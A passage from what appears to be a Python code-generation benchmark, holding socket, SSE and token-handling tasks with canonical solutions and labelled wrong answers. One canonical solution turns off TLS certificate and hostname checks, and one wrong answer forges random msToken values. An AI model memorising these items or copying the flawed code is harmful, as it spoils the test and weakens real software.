    "wrong_result": "```python\nimport httpx\nimport yaml\nimport random\nimport string\n\nclass TokenManager:\n    def __init__(self):\n        with open('config.yaml', 'r') as file:\n            config = yaml.safe_load(file)\n        self.token_conf = config.get('token_conf', {})\n        self.ttwid_conf = config.get('ttwid_conf', {})\n        self.odin_tt_conf = config.get('odin_tt_conf', {})\n        self.proxies = config.get('proxies', {})\n\n    def gen_real_msToken(self) -> str:\n        try:\n            response = httpx.post(\n                self.token_conf['url'],\n                headers=self.token_conf['headers'],\n                json=self.token_conf['payload'],\n                proxies=self.proxies,\n                timeout=10\n            )\n            response.raise_for_status()\n            return response.json().get('msToken', '')\n        except Exception:\n            return self.gen_false_msToken()\n\n    def gen_false_msToken(self) -> str:\n        return ''.join(random.choices(string.ascii_letters + string.digits, k=64))\n\n    def gen_ttwid(self, cookie: str) -> str:\n        try:\n            response = httpx.post(\n                self.ttwid_conf['url'],\n                data={'cookie': cookie},\n                proxies=self.proxies,\n                timeout=10\n            )\n            response.raise_for_status()\n            return response.json().get('ttwid', '')\n        except Exception:\n            return ''\n\n    def gen_odin_tt(self) -> str:\n        try:\n            response = httpx.get(\n                self.odin_tt_conf['url'],\n                proxies=self.proxies,\n                timeout=10\n            )\n            response.raise_for_status()\n            return response.text.strip()\n        except Exception:\n            return ''\n```"
  },
  {
    "Task_id": 370,
    "Instruction": "Task Description: Create a TCP client class for interacting with an OpenVPN server, capable of establishing connections, sending commands, receiving data, and closing connections.\n\nClass Description: The OpenVPNTCPClient class provides functionality to connect to an OpenVPN server via TCP, send commands, receive responses, and manage the connection lifecycle.\n\nAttributes:\n- host: str - The IP address or hostname of the OpenVPN server\n- port: int - The port number on which the OpenVPN server is listening\n- timeout: int - Connection and operation timeout in seconds (default: 10)\n- socket: socket.socket - The TCP socket object used for communication\n\nMethods:\n- connect() -> bool - Establishes a TCP connection to the OpenVPN server. Returns True on success, False on failure.\n- send_command(command: str) -> bool - Sends a command to the connected OpenVPN server. Returns True on success, False on failure.\n- receive_data() -> list[bytes] | None - Receives data from the server until an 'END' marker is encountered. Returns list of received lines or None on error.\n- close() -> bool - Closes the TCP connection. Returns True on success, False on failure.\n- get_status() -> list[bytes] | None - Executes a complete status request cycle (connect, send 'status' command, receive response, close). Returns received data or None on error.",
    "Canonical_solution": "import socket\n\nclass OpenVPNTCPClient:\n    def __init__(self, host, port, timeout=10):\n        self.host = host\n        self.port = port\n        self.timeout = timeout\n        self.socket = None\n\n    def connect(self):\n        try:\n            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            self.socket.settimeout(int(self.timeout))\n            self.socket.connect((self.host, self.port))\n            return True\n        except socket.error as e:\n            return False\n\n    def send_command(self, command):\n        try:\n            self.socket.send(command + '\\r\\n')\n            return True\n        except socket.error as e:\n            return False\n\n    def receive_data(self):\n        try:\n            fd = self.socket.makefile('rb')\n            lines = []\n            while True:\n                line = fd.readline()\n                lines.append(line)\n                if line.strip() == 'END':\n                    break\n            return lines\n        except socket.error as e:\n            return None\n\n    def close(self):\n        try:\n            if self.socket:\n                self.socket.close()\n            return True\n        except socket.error:\n            return False\n\n    def get_status(self):\n        if not self.connect():\n            return None\n        \n        if not self.send_command('status'):\n            self.close()\n            return None\n        \n        data = self.receive_data()\n        self.close()\n        \n        return data",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "wrong_result": "import socket\n\nclass OpenVPNTCPClient:\n    def __init__(self, host: str, port: int, timeout: int = 10):\n        self.host = host\n        self.port = port\n        self.timeout = timeout\n        self.socket = None\n\n    def connect(self) -> bool:\n        try:\n            self.socket = socket.create_connection((self.host, self.port), self.timeout)\n            return True\n        except Exception as e:\n            print(f\"Connection failed: {e}\")\n            return False\n\n    def send_command(self, command: str) -> bool:\n        if not self.socket:\n            return False\n        try:\n            self.socket.sendall((command + '\\n').encode('utf-8'))\n            return True\n        except Exception as e:\n            print(f\"Send command failed: {e}\")\n            return False\n\n    def receive_data(self) -> list[bytes] | None:\n        if not self.socket:\n            return None\n        try:\n            data = []\n            while True:\n                line = self.socket.recv(4096)\n                if not line:\n                    break\n                data.append(line)\n                if b'END' in line:\n                    break\n            return data\n        except Exception as e:\n            print(f\"Receive data failed: {e}\")\n            return None\n\n    def close(self) -> bool:\n        if self.socket:\n            try:\n                self.socket.close()\n                return True\n            except Exception as e:\n                print(f\"Close connection failed: {e}\")\n                return False\n        return True\n\n    def get_status(self) -> list[bytes] | None:\n        if not self.connect():\n            return None\n        if not self.send_command('status'):\n            self.close()\n            return None\n        data = self.receive_data()\n        self.close()\n        return data"
  },
  {
    "Task_id": 373,
    "Instruction": "Task Description: Implement a TCP client in Python that can handle multiple types of HTTP requests concurrently using threading and locking mechanisms to manage shared resources.\n\nFunction Description: The code consists of two main functions that perform HTTP GET requests to a server. `long_request` handles a request with a large response, processing it in chunks with delays, while `time_request` handles a quicker request. A threading lock is used to synchronize access to shared resources between these concurrent requests.\n\nInput:\n- `hostname` (str): The target server's hostname or IP address\n- `port` (int): The target server's port number\n- `headers` (str): Additional HTTP headers to include in the request\n\nOutput:\n- Both functions print status messages ('acquire' and 'release') to indicate lock status\n- No explicit return value, but data is received from the server and processed\n- Network connections are properly closed when complete\n\nMethods:\n- `long_request(hostname, port, headers) -> None`: \n  Performs a long-running HTTP GET request, receiving data in chunks with delays between receives. Releases a lock after initial processing and continues receiving more data.\n\n- `time_request(hostname, port, headers) -> None`: \n  Performs a quicker HTTP GET request, acquires a lock before execution, receives all data at once, and closes the connection.\n\nShared Resource:\n- `lock` (threading.Lock): A threading lock used to synchronize access between the two request functions",
    "Canonical_solution": "import sys\nimport socket\nimport time\nimport threading\n\ndef long_request(hostname, port, headers):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((hostname, port))\n    s.send('GET /huge HTTP/1.0' + headers)\n    for i in range(1):\n        s.recv(80)\n        time.sleep(0.1)\n    lock.release()\n    print('release')\n    for i in range(10):\n        s.recv(80)\n        time.sleep(0.1)\n    s.close()\n\ndef time_request(hostname, port, headers):\n    lock.acquire()\n    print('acquire')\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((hostname, port))\n    s.send('GET /tuple HTTP/1.0' + headers)\n    s.recv(900)\n    s.close()\n\nlock = threading.Lock()",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "import socket\nimport threading\nimport time\n\nlock = threading.Lock()\n\ndef long_request(hostname, port, headers):\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.connect((hostname, port))\n        request = f\"GET /large-response HTTP/1.1\\r\\nHost: {hostname}\\r\\n{headers}\\r\\n\\r\\n\"\n        s.sendall(request.encode())\n        \n        print(\"acquire\")\n        lock.acquire()\n        try:\n            while True:\n                data = s.recv(1024)\n                if not data:\n                    break\n                print(\"Processing chunk...\")\n                time.sleep(1)  # Simulate processing delay\n        finally:\n            lock.release()\n            print(\"release\")\n\ndef time_request(hostname, port, headers):\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.connect((hostname, port))\n        request = f\"GET /quick-response HTTP/1.1\\r\\nHost: {hostname}\\r\\n{headers}\\r\\n\\r\\n\"\n        s.sendall(request.encode())\n        \n        print(\"acquire\")\n        lock.acquire()\n        try:\n            data = s.recv(4096)\n            print(\"Received quick response\")\n        finally:\n            lock.release()\n            print(\"release\")"
  },
  {
    "Task_id": 374,
    "Instruction": "Task Description: The task involves creating a Python function that reads log files, extracts specific messages, and sends them to a server using TCP socket communication. The function should parse log entries, identify relevant messages, and transmit them to the appropriate server ports based on the protocol specified in the logs.\n\nFunction Description: The function `send_messages_to_server` processes a log file to extract session IDs, protocols, and hexadecimal messages. It then establishes TCP connections to servers based on the protocols (using ports defined in an XML configuration file) and sends the decoded messages to the respective servers. The function includes a delay between messages to avoid overwhelming the server.\n\nInput: \n- `path` (str): The file path to the log file that contains the messages to be processed and sent. The log file should have entries matching the pattern `YYYY-MM-DD HH:MM:SS  INFO: [SESSION_ID: PROTOCOL < IP_ADDRESS] HEX_MESSAGE`.\n\nOutput: \n- None: The function does not return any value but performs side effects by sending messages to the server and closing the connections.\n\nNote: The function relies on an external XML file (`default.xml`) located in a `../setup/` directory relative to the script's location. This XML file should contain port mappings for different protocols under entries with keys ending in `.port`.",
    "Canonical_solution": "import sys\nimport re\nimport os\nimport xml.etree.ElementTree\nimport socket\nimport binascii\nimport time\n\ndef load_ports():\n    ports = {}\n    dir = os.path.dirname(os.path.abspath(__file__))\n    root = xml.etree.ElementTree.parse(dir + '/../setup/default.xml').getroot()\n    for entry in root.findall('entry'):\n        key = entry.attrib['key']\n        if key.endswith('.port'):\n            ports[key[:-5]] = int(entry.text)\n    return ports\n\ndef send_messages_to_server(path):\n    p = re.compile(r\"\\d{4}-\\d{2}-\\d{2} \\d{2}:\\d{2}:\\d{2}  INFO: \\[([TU][0-9a-fA-F]{8}): (\\S+) < [\\d.]+] ([0-9a-fA-F]+)\")\n    ports = load_ports()\n    protocols = {}\n    messages = {}\n\n    for line in open(path):\n        m = p.match(line)\n        if m:\n            session = m.group(1)\n            protocol = m.group(2)\n            message = m.group(3)\n            protocols[session] = protocol\n            if session not in messages:\n                messages[session] = []\n            messages[session].append(message)\n\n    for session in protocols:\n        port = ports[protocols[session]]\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect((\"localhost\", int(port)))\n        for message in messages[session]:\n            s.send(binascii.unhexlify(message))\n            time.sleep(0.1)\n        s.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport xml.etree.ElementTree as ET\nimport socket\nimport time\n\ndef send_messages_to_server(path):\n    tree = ET.parse('../setup/default.xml')\n    root = tree.getroot()\n    ports = {elem.tag: int(elem.text) for elem in root if elem.tag.endswith('.port')}\n    \n    with open(path, 'r') as file:\n        for line in file:\n            parts = line.strip().split(' ')\n            if len(parts) >= 5 and parts[3].startswith('[SESSION_ID:') and parts[4].startswith('INFO'):\n                session_id, protocol, ip_address = parts[3][11:-1].split(' ')\n                hex_message = parts[5]\n                \n                if protocol in ports:\n                    try:\n                        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n                            s.connect((ip_address, ports[protocol]))\n                            message = bytes.fromhex(hex_message)\n                            s.sendall(message)\n                            time.sleep(0.1)  # Delay to avoid overwhelming the server\n                    except Exception as e:\n                        print(f\"Failed to send message for session {session_id}: {e}\")\n\n# Example usage\n# send_messages_to_server('path/to/logfile.log')\n```"
  },
  {
    "Task_id": 376,
    "Instruction": "Task Description: Create a thread-safe TCP socket wrapper class that handles connection management, data transmission, and SSL/TLS encryption with proper resource cleanup.\n\nClass Description: SafeStreamSocket is a robust socket wrapper that provides safe connection handling, unique socket identification, and SSL/TLS capabilities. It manages socket lifecycle including proper cleanup and supports both IPv4 and Unix domain sockets.\n\nAttributes:\n_id: [int] - Unique identifier for the socket instance\n_dup_sock: [socket.socket] - Duplicate socket used during SSL/TLS handshake\n_name: [str] - Optional name identifier for the socket\n_sock: [socket.socket] - Main socket connection object\n_finalizer: [weakref.finalize] - Weak reference finalizer for cleanup\n_id_numbers: [class attribute, list[int]] - Tracks all active socket IDs\n_n: [class attribute, list[int]] - Counter for generating unique IDs\n\nMethods:\n__init__: [constructor](addr: Union[str, Tuple[str, int], socket.socket, Any]) -> None - Initializes socket connection with the given address\n_acquire_uid: [_acquire_uid]() -> int - Generates a unique ID for the socket instance\n_connect: [_connect](addr: Union[str, Tuple[str, int], socket.socket, Any]) -> socket.socket - Establishes connection to the specified address\n_cleanup: [_cleanup]() -> None - Performs cleanup operations when socket is closed\n_release_uid: [_release_uid](id: int) -> None - Releases the socket ID when closed\nclose: [close]() -> None - Closes the socket connection\nclosed: [property]() -> bool - Returns whether socket is closed\nid: [property]() -> int - Returns socket ID\nname: [property]() -> str - Gets socket name\nname: [setter](new_name: str) -> None - Sets socket name\nget_socket: [get_socket]() -> socket.socket - Returns underlying socket object\nrecv: [recv](bufsize: int = 4096) -> bytes - Receives data from socket\nrecvall: [recvall](size: int) -> bytearray - Receives exact amount of data\nsendall: [sendall](data: Union[bytes, bytearray]) -> int - Sends all data through socket\nswitch_to_ssl: [switch_to_ssl](pemfile: str) -> None - Upgrades connection to SSL/TLS\n__enter__: [__enter__]() -> SafeStreamSocket - Context manager entry\n__exit__: [__exit__](*args) -> None - Context manager exit",
    "Canonical_solution": "import logging\nimport os\nimport socket\nimport ssl\nimport threading\nimport typing\nimport weakref\nfrom typing import Any, Union\n\nclass SafeStreamSocket:\n    def __init__(self, addr: Union[str, typing.Tuple[str, int], socket.socket, Any]):\n        self._id = self._acquire_uid()\n        self._dup_sock = None\n        self._name = None\n        self._sock = self._connect(addr)\n        self._finalizer = weakref.finalize(self, self._cleanup)\n\n    def _acquire_uid(self) -> int:\n        with threading.Lock():\n            self._id_numbers.append(self._n[0])\n            _id = self._n[0]\n            self._n[0] += 1\n        logging.debug(\"Opening socket: id=%d\", _id)\n        return _id\n\n    def _connect(self, addr: Union[str, typing.Tuple[str, int], socket.socket, Any]) -> socket.socket:\n        if isinstance(addr, socket.socket):\n            return addr\n        if isinstance(addr, str):\n            if ':' in addr:\n                host, port = addr.split(\":\", 1)\n                addr = (host, int(port))\n                family = socket.AF_INET\n            elif os.path.exists(addr):\n                family = socket.AF_UNIX\n            else:\n                raise SocketError(f\"socket unix:{addr} unable to connect\")\n        else:\n            family = socket.AF_INET\n        sock = socket.socket(family, socket.SOCK_STREAM)\n        sock.connect(addr)\n        return sock\n\n    def _cleanup(self):\n        self._release_uid(self.id)\n        sock = self._dup_sock or self._sock\n        try:\n            sock.shutdown(socket.SHUT_RDWR)\n        except OSError:\n            pass\n        sock.close()\n\n    def _release_uid(self, id: int):\n        try:\n            self._id_numbers.remove(id)\n        except ValueError:\n            pass\n        logging.debug(\"Closing socket, id=%d\", id)\n\n    def close(self):\n        self._finalizer()\n\n    @property\n    def closed(self) -> bool:\n        return not self._finalizer.alive\n\n    @property\n    def id(self) -> int:\n        return self._id\n\n    @property\n    def name(self) -> str:\n        return self._name\n\n    @name.setter\n    def name(self, new_name: str):\n        self._name = new_name\n\n    def get_socket(self) -> socket.socket:\n        return self._sock\n\n    def recv(self, bufsize: int = 4096) -> bytes:\n        try:\n            return self._sock.recv(bufsize)\n        except socket.timeout as e:\n            raise SocketError(\"socket timeout\") from e\n        except ssl.SSLError as e:\n            raise SocketError(\"ssl error\") from e\n        except Exception as e:\n            raise SocketError(\"socket error\") from e\n\n    def recvall(self, size: int) -> bytearray:\n        buf = bytearray()\n        while len(buf) < size:\n            chunk = self.recv(size-len(buf))\n            if not chunk:\n                raise SocketError(\"recvall: socket connection broken\")\n            buf.extend(chunk)\n        return buf\n\n    def sendall(self, data: Union[bytes, bytearray]) -> int:\n        try:\n            return self._sock.sendall(data)\n        except Exception as e:\n            raise SocketError(\"sendall error\") from e\n\n    def switch_to_ssl(self, pemfile):\n        context = ssl.SSLContext(ssl.PROTOCOL_TLS)\n        try:\n            context.verify_mode = ssl.CERT_NONE\n            context.set_ciphers(\"ALL:@SECLEVEL=0\")\n        except ssl.SSLError:\n            pass\n        self._dup_sock = self._sock.dup()\n        context.load_cert_chain(pemfile, keyfile=pemfile)\n        context.check_hostname = False\n        self._sock = context.wrap_socket(self._sock, server_hostname=\"iphone.localhost\")\n\n    def __enter__(self):\n        return self\n\n    def __exit__(self, *args):\n        self.close()",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\nimport ssl\nimport weakref\nfrom typing import Union, Tuple, Any\n\nclass SafeStreamSocket:\n    _id_numbers = []\n    _n = 0\n\n    def __init__(self, addr: Union[str, Tuple[str, int], socket.socket, Any]) -> None:\n        self._id = self._acquire_uid()\n        self._dup_sock = None\n        self._name = \"\"\n        self._sock = None\n        self._finalizer = weakref.finalize(self, self._cleanup)\n        if isinstance(addr, socket.socket):\n            self._sock = addr\n        else:\n            self._sock = self._connect(addr)\n\n    def _acquire_uid(self) -> int:\n        while True:\n            self._n += 1\n            if self._n not in self._id_numbers:\n                self._id_numbers.append(self._n)\n                return self._n\n\n    def _connect(self, addr: Union[str, Tuple[str, int], socket.socket, Any]) -> socket.socket:\n        s = socket.socket(socket.AF_INET if isinstance(addr, tuple) else socket.AF_UNIX)\n        s.connect(addr)\n        return s\n\n    def _cleanup(self) -> None:\n        self._release_uid(self._id)\n        if self._sock:\n            self._sock.close()\n\n    def _release_uid(self, id: int) -> None:\n        if id in self._id_numbers:\n            self._id_numbers.remove(id)\n\n    def close(self) -> None:\n        self._finalizer()\n\n    @property\n    def closed(self) -> bool:\n        return self._sock is None or not self._sock.fileno() > 0\n\n    @property\n    def id(self) -> int:\n        return self._id\n\n    @property\n    def name(self) -> str:\n        return self._name\n\n    @name.setter\n    def name(self, new_name: str) -> None:\n        self._name = new_name\n\n    def get_socket(self) -> socket.socket:\n        return self._sock\n\n    def recv(self, bufsize: int = 4096) -> bytes:\n        if self.closed:\n            raise ValueError(\"Socket is closed\")\n        return self._sock.recv(bufsize)\n\n    def recvall(self, size: int) -> bytearray:\n        data = bytearray()\n        while len(data) < size:\n            packet = self.recv(size - len(data))\n            if not packet:\n                raise EOFError(\"Unexpected end-of-file\")\n            data.extend(packet)\n        return data\n\n    def sendall(self, data: Union[bytes, bytearray]) -> int:\n        if self.closed:\n            raise ValueError(\"Socket is closed\")\n        self._sock.sendall(data)\n        return len(data)\n\n    def switch_to_ssl(self, pemfile: str) -> None:\n        if self.closed:\n            raise ValueError(\"Socket is closed\")\n        context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)\n        context.load_cert_chain(certfile=pemfile)\n        self._dup_sock = self._sock\n        self._sock = context.wrap_socket(self._sock, server_side=False)\n\n    def __enter__(self) -> 'SafeStreamSocket':\n        return self\n\n    def __exit__(self, *args) -> None:\n        self.close()\n```"
  },
  {
    "Task_id": 377,
    "Instruction": "Task Description: Create a TCP/UDP/RAW socket server class that can handle incoming connections, receive data, and optionally send responses. The server should support different protocols (TCP, UDP, RAW) and provide methods for single interaction or receiving until a specific pattern is matched.\n\nClass Description: MiniTestServer is a versatile socket server implementation that supports TCP, UDP, and RAW packet protocols. It can operate in silent mode (only receiving) or respond to clients, and includes timeout handling for operations.\n\nAttributes:\n- server_socket: [socket.socket] - The underlying socket object\n- received: [bytes] - The last received data from a client\n- data_to_send: [bytes] - Default data to send in response (default: b\"\\xfe\\xeb\\xda\\xed\")\n- active_port: [int] - The port number the server is bound to\n- stay_silent: [bool] - If True, server won't send responses (default: False)\n- proto: [str] - Protocol type ('tcp', 'udp', or 'raw') (default: 'tcp')\n- host: [str] - Host address to bind to (default: '0.0.0.0')\n- timeout: [int] - Operation timeout in seconds (default: 5)\n\nMethods:\n- __init__(stay_silent=False, proto=\"tcp\", host=\"0.0.0.0\") -> None - Initializes the server with optional parameters\n- bind() -> None - Creates and binds the socket according to the specified protocol\n- serve_once() -> None - Handles a single client interaction (receive and optionally send)\n- receive_until(expected) -> None - (RAW only) Receives data until matching expected pattern or timeout",
    "Canonical_solution": "import socket\nimport threading\nimport time\n\nclass MiniTestServer:\n    def __init__(self, stay_silent=False, proto=\"tcp\", host=\"0.0.0.0\"):\n        self.server_socket = None\n        self.received = None\n        self.data_to_send = b\"\\xfe\\xeb\\xda\\xed\"\n        self.active_port = None\n        self.stay_silent = stay_silent\n        self.proto = proto\n        self.host = host\n        self.timeout = 5\n\n    def bind(self):\n        if self.proto == \"tcp\":\n            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        elif self.proto == \"udp\":\n            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        elif self.proto == \"raw\":\n            self.server_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))\n        else:\n            raise Exception(\"Invalid protocol type: '{0}'\".format(self.proto))\n\n        self.server_socket.bind((self.host, 0))\n        if self.proto == \"tcp\":\n            self.server_socket.listen(1)\n        self.active_port = self.server_socket.getsockname()[1]\n\n    def serve_once(self):\n        self.server_socket.settimeout(self.timeout)\n\n        if self.proto == \"tcp\":\n            (client_socket, address) = self.server_socket.accept()\n            self.received = client_socket.recv(10000)\n            if not self.stay_silent:\n                client_socket.send(self.data_to_send)\n            client_socket.close()\n        elif self.proto == \"udp\":\n            data, addr = self.server_socket.recvfrom(1024)\n            self.received = data\n            if not self.stay_silent:\n                self.server_socket.sendto(self.data_to_send, addr)\n        elif self.proto == \"raw\":\n            data, addr = self.server_socket.recvfrom(10000)\n            self.received = data\n            if not self.stay_silent:\n                self.server_socket.sendto(self.data_to_send, addr)\n        else:\n            raise Exception(\"Invalid protocol type: '{0}'\".format(self.proto))\n\n        self.server_socket.close()\n        self.server_socket = None\n        self.active_port = None\n\n    def receive_until(self, expected):\n        self.server_socket.settimeout(self.timeout)\n\n        if self.proto == \"raw\":\n            elapsed_time = 0\n            start_time = time.time()\n            while elapsed_time < self.timeout:\n                self.server_socket.settimeout(self.timeout - elapsed_time)\n                try:\n                    data, addr = self.server_socket.recvfrom(10000)\n                    if data == expected:\n                        self.received = data\n                        if not self.stay_silent:\n                            self.server_socket.sendto(self.data_to_send, addr)\n                        break\n                except socket.timeout:\n                    break\n                elapsed_time = time.time() - start_time\n        else:\n            raise Exception(\"Invalid protocol type: '{0}'\".format(self.proto))\n\n        self.server_socket.close()\n        self.server_socket = None\n        self.active_port = None",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "wrong_result": "```python\nimport socket\n\nclass MiniTestServer:\n    def __init__(self, stay_silent=False, proto=\"tcp\", host=\"0.0.0.0\", port=0, timeout=5):\n        self.server_socket = None\n        self.received = b\"\"\n        self.data_to_send = b\"\\xfe\\xeb\\xda\\xed\"\n        self.active_port = port\n        self.stay_silent = stay_silent\n        self.proto = proto.lower()\n        self.host = host\n        self.timeout = timeout\n\n    def bind(self):\n        if self.proto == \"tcp\":\n            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        elif self.proto == \"udp\":\n            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        elif self.proto == \"raw\":\n            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)\n        else:\n            raise ValueError(\"Unsupported protocol\")\n\n        self.server_socket.bind((self.host, self.active_port))\n        self.active_port = self.server_socket.getsockname()[1]\n\n    def serve_once(self):\n        self.server_socket.settimeout(self.timeout)\n        try:\n            if self.proto == \"tcp\":\n                self.server_socket.listen(1)\n                client_socket, addr = self.server_socket.accept()\n                with client_socket:\n                    self.received = client_socket.recv(1024)\n                    if not self.stay_silent:\n                        client_socket.sendall(self.data_to_send)\n            elif self.proto == \"udp\":\n                self.received, addr = self.server_socket.recvfrom(1024)\n                if not self.stay_silent:\n                    self.server_socket.sendto(self.data_to_send, addr)\n            elif self.proto == \"raw\":\n                self.received = self.server_socket.recv(1024)\n                if not self.stay_silent:\n                    self.server_socket.send(self.data_to_send)\n        except socket.timeout:\n            pass\n\n    def receive_until(self, expected):\n        if self.proto != \"raw\":\n            raise ValueError(\"receive_until method is only supported for RAW protocol\")\n\n        self.server_socket.settimeout(self.timeout)\n        buffer = b\"\"\n        try:\n            while expected not in buffer:\n                chunk = self.server_socket.recv(1024)\n                if not chunk:\n                    break\n                buffer += chunk\n        except socket.timeout:\n            pass\n\n        self.received = buffer\n```"
  },
  {
    "Task_id": 38,
    "Instruction": "Task Description: Implement a function that handles Server-Sent Events (SSE) from an HTTP POST request, processes the incoming data streams, and yields appropriate message objects or raises errors when encountered.\n\nFunction Description: The function `_sse_post` establishes an SSE connection to a specified URL, sends a POST request with provided data and headers, and processes the incoming event stream. It handles different message types by yielding appropriate message objects (ReasoningMessage, ToolCallMessage, ToolReturnMessage, LettaUsageStatistics) or stream status updates (MessageStreamStatus). It also handles errors, including context window errors and JSON parsing errors, by raising appropriate exceptions.\n\nInput:\n- url: str - The URL to which the POST request will be sent.\n- data: dict - The JSON data to be sent in the POST request body.\n- headers: dict - The headers to be included in the POST request.\n\nOutput:\n- Generator[LettaStreamingResponse, None, None] - A generator that yields objects of type LettaStreamingResponse (which can be ReasoningMessage, ToolCallMessage, ToolReturnMessage, LettaUsageStatistics, or MessageStreamStatus) as the events are received from the server. Raises LLMError for context window errors or other appropriate exceptions for other errors.",
    "Canonical_solution": "import json\nfrom typing import Generator\nimport httpx\nfrom httpx_sse import SSEError, connect_sse\nfrom letta.constants import OPENAI_CONTEXT_WINDOW_ERROR_SUBSTRING\nfrom letta.errors import LLMError\nfrom letta.schemas.enums import MessageStreamStatus\nfrom letta.schemas.letta_message import ReasoningMessage, ToolCallMessage, ToolReturnMessage\nfrom letta.schemas.letta_response import LettaStreamingResponse\nfrom letta.schemas.usage import LettaUsageStatistics\n\ndef _sse_post(url: str, data: dict, headers: dict) -> Generator[LettaStreamingResponse, None, None]:\n    with httpx.Client() as client:\n        with connect_sse(client, method=\"POST\", url=url, json=data, headers=headers) as event_source:\n            if not event_source.response.is_success:\n                response_bytes = event_source.response.read()\n                response_dict = json.loads(response_bytes.decode(\"utf-8\"))\n                error_message = response_dict[\"error\"][\"message\"]\n                if OPENAI_CONTEXT_WINDOW_ERROR_SUBSTRING in error_message:\n                    raise LLMError(error_message)\n                event_source.response.raise_for_status()\n\n            try:\n                for sse in event_source.iter_sse():\n                    if sse.data in [status.value for status in MessageStreamStatus]:\n                        yield MessageStreamStatus(sse.data)\n                    else:\n                        chunk_data = json.loads(sse.data)\n                        if \"reasoning\" in chunk_data:\n                            yield ReasoningMessage(**chunk_data)\n                        elif \"tool_call\" in chunk_data:\n                            yield ToolCallMessage(**chunk_data)\n                        elif \"tool_return\" in chunk_data:\n                            yield ToolReturnMessage(**chunk_data)\n                        elif \"step_count\" in chunk_data:\n                            yield LettaUsageStatistics(**chunk_data)\n                        else:\n                            raise ValueError(f\"Unknown message type in chunk_data: {chunk_data}\")\n\n            except SSEError as e:\n                if \"application/json\" in str(e):\n                    response = client.post(url=url, json=data, headers=headers)\n                    if response.headers[\"Content-Type\"].startswith(\"application/json\"):\n                        error_details = response.json()\n                raise e\n\n            except Exception as e:\n                raise e",
    "Code_level": "Function-level",
    "FSMID_for_test": 58,
    "wrong_result": "```python\nimport json\nfrom typing import Generator, Dict\nfrom http.client import HTTPConnection\nfrom urllib.parse import urlparse\n\nclass LLMError(Exception):\n    pass\n\nclass ReasoningMessage:\n    def __init__(self, content: str):\n        self.content = content\n\nclass ToolCallMessage:\n    def __init__(self, tool_name: str, parameters: Dict):\n        self.tool_name = tool_name\n        self.parameters = parameters\n\nclass ToolReturnMessage:\n    def __init__(self, tool_name: str, result: Dict):\n        self.tool_name = tool_name\n        self.result = result\n\nclass LettaUsageStatistics:\n    def __init__(self, usage_data: Dict):\n        self.usage_data = usage_data\n\nclass MessageStreamStatus:\n    def __init__(self, status: str):\n        self.status = status\n\ndef _sse_post(url: str, data: dict, headers: dict) -> Generator['LettaStreamingResponse', None, None]:\n    parsed_url = urlparse(url)\n    conn = HTTPConnection(parsed_url.netloc)\n    headers['Content-Type'] = 'application/json'\n    conn.request(\"POST\", parsed_url.path, body=json.dumps(data), headers=headers)\n    response = conn.getresponse()\n    \n    if response.status != 200:\n        raise Exception(f\"Failed to establish SSE connection: {response.status} {response.reason}\")\n    \n    try:\n        while True:\n            line = response.readline().decode('utf-8').strip()\n            if not line:\n                continue\n            if line.startswith('data:'):\n                event_data = line[len('data:'):].strip()\n                if event_data:\n                    try:\n                        event_json = json.loads(event_data)\n                        event_type = event_json.get('type')\n                        if event_type == 'reasoning':\n                            yield ReasoningMessage(event_json['content'])\n                        elif event_type == 'tool_call':\n                            yield ToolCallMessage(event_json['tool_name'], event_json['parameters'])\n                        elif event_type == 'tool_return':\n                            yield ToolReturnMessage(event_json['tool_name'], event_json['result'])\n                        elif event_type == 'usage_statistics':\n                            yield LettaUsageStatistics(event_json['usage_data'])\n                        elif event_type == 'stream_status':\n                            yield MessageStreamStatus(event_json['status'])\n                        else:\n                            raise ValueError(f\"Unknown event type: {event_type}\")\n                    except json.JSONDecodeError:\n                        raise LLMError(\"Failed to parse JSON data\")\n            elif line.startswith('event:'):\n                event_type = line[len('event:'):].strip()\n                if event_type == 'error' or event_type == 'context_window_error':\n                    raise LLMError(\"Context window error occurred\")\n    finally:\n        conn.close()\n```"
  },
  {
    "Task_id": 382,
    "Instruction": "Task Description: Implement a TCP server for handling Tuya smart device communication, including session key negotiation and device state query responses.\n\nFunction Description: The function establishes a TCP server that listens for incoming Tuya device connections, handles secure session key negotiation, and responds to device state queries. It maintains communication security through HMAC verification and AES encryption.\n\nInput:\n- None (uses module-level constants: bind_host, bind_port, real_key)\n\nOutput:\n- None (continuously runs as a server, maintains active connections and handles client communication)\n\nKey Operations:\n1. Creates an IPv6 TCP socket with SO_REUSEADDR option\n2. Binds to specified host/port and listens for connections\n3. Uses select() for non-blocking I/O multiplexing\n4. Handles three message types:\n   - SESS_KEY_NEG_START: Initiates secure session negotiation\n   - SESS_KEY_NEG_FINISH: Completes session key exchange\n   - DP_QUERY_NEW: Responds to device state queries with mock data\n5. Maintains sequence numbers and temporary keys for each session\n6. Automatically closes stale connections\n\nSecurity Features:\n- HMAC-SHA256 for message authentication\n- AES encryption for session keys\n- Nonce-based key exchange protocol\n\nError Handling:\n- Automatically recovers from client disconnections\n- Handles malformed messages with error responses\n- Maintains connection state between messages",
